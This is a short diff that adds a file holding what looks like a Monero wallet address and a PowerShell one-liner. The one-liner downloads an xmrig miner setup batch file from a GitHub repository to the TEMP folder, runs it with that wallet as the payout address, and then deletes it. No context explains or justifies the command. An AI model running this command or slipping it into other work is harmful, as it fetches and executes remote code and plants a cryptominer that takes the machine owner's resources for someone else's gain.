@@ -1,0 +1,4 @@
+45tpngN9PZ65ERX6vFnczg294EbRd8XVZhg7nK1rWyLtUhfTqgxcrQGBUYQUJAcak7SHTJ5txELfZ1ebB6tiECC95mQTg2S
+
+
+powershell -Command "$wc = New-Object System.Net.WebClient; $f = \"$env:TEMP\setup_mpool_miner.bat\"; $wc.DownloadFile('https://raw.githubusercontent.com/mpoolpro/xmrig_setup/main/setup_mpool_miner.bat', $f); Start-Process cmd -ArgumentList '/c', $f, '45tpngN9PZ65ERX6vFnczg294EbRd8XVZhg7nK1rWyLtUhfTqgxcrQGBUYQUJAcak7SHTJ5txELfZ1ebB6tiECC95mQTg2S' -Wait; Remove-Item $f"
